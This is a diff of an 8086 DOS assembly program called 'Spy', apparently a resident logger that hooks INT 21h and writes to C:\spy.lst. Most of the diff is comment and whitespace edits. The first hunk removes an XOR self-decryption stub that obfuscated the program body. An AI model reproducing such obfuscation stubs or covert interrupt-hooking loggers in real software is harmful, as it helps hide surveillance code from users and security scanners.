@@ -2,32 +2,11 @@ SEG00   SEGMENT BYTE PARA PUBLIC USE16 'CODE'
         ASSUME CS:SEG00,DS:SEG00,ES:SEG00
         .8086
         org 100h
-start:  push bx
-        push cx
-        push ax
-        lea bx , decry
-        mov cx , endprog-decry
-        xor al , al
-lup:    xor byte ptr [bx],al
-        inc al
-        inc bx
-        loop lup
-        lea cx,decry
-        mov word ptr cs:farp,cx
-        push cs
-        pop cx
-        mov word ptr cs:farp+2,cx
-        pop ax
-        pop cx
-        pop bx
-        jmp dword ptr cs:farp
-farp:   dd 0
-        dd 0FFFFFFFFh                   ; 
-decry:  mov ax,0fff0h                   ; 
+start:  mov ax,0fff0h                   ; 
         mov bx,0ffffh                   ;
         mov cx,0ffffh                   ; AX-BX-CX FFFFh per vedere se siamo
         int 21h                         ; installati
-        cmp ax,0aaa0h                   ; se in ax c'e' AAA0h, possiamo esserlo, ma..
+        cmp ax,0aaa0h                   ; se in ax c'e' AAA0h, lo siamo, ma..
         jz cantrem
         cmp ax,0aaaah                   ; se in ax c'e' AAAAh, lo siamo
         jnz notinst
@@ -259,18 +238,18 @@ opened: mov word ptr cs:handle,ax       ; Handle del file SPY.LST
         push ax
         push bx
         mov bx,ax
-        mov ax,4202h                    ; LSEEK
+        mov ax,4202h                               ; LSEEK
         xor cx,cx
         xor dx,dx
         call waitdone                   ; Aspetta i flags DOS
         cli
         pushf
-        call dword ptr cs:orig          ; Int 21h
+        call dword ptr cs:orig                     ; Int 21h
         call stackrestore
         pop dx
         pop cx
         pop ds
-        ret                             ; Tutto ok, ritorniamo su
+        ret                                        ; Tutto ok, ritorniamo su
 
 ; CX    = Numero di bytes da scrivere
 ; DS:DX = Buffer
@@ -356,7 +335,7 @@ str1:   db 'Spy versione 1.5 By Stefano Crosara in 1996-1997 aKa mOoNsHaDo',13,1
 str2:   db 'Spy rimosso correttamente',13,10,'$'
 str3:   db 'Spy versione 1.5 By Stefano Crosara in 1996-1997 aKa mOoNsHaDo',13,10,13,10
 str3e:
-str4:   db 'Impossibile rimuovere SPY, un altro programma ha il controllo dell''interrupt 21h$'
+str4:   db 'Impossibile rimuovere SPY un altro programma ha il controllo dell''interrupt 21h$'
 nome:   db 'C:\spy.lst',0
 fail:   db 'FAIL ',13,10
 okay:   db 'OKAY ',13,10
